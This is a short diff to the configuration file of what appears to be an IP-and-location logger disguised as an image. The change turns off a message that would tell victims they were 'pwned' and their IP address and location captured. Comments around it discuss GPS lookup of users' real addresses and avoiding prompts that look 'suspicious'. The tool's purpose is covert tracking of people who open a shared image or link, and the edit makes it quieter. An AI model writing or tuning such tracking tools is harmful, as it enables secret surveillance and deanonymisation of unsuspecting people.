@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by the creator of this website, I now have your ip address and your approximate location. Next time, Don't go around going on websites people tell you to or use a vpn because next time it might not be a person with good intensions.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
